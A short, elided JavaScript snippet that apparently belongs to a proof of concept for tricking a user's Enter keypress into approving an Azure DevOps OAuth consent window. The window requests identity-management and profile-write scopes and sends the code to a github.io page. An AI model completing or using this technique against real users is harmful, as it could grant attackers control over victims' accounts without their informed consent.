    ...
    if (event.key === "Enter") {
        setTimeout(() => {
            if (!attack) {
                ...
                var win = window.open(
                    "https://app.vssps.visualstudio.com/oauth2/authorize?client_id=A355BD16-89BC-4ADD-9149-03A13A31A39B&redirect_uri=https://nikhilkaushikop.github.io/Azure-DevOps-Oauth-API/&scope=vso.identity_manage+vso.profile_write&response_type=code#accept-button",
                    "oauthWindow",
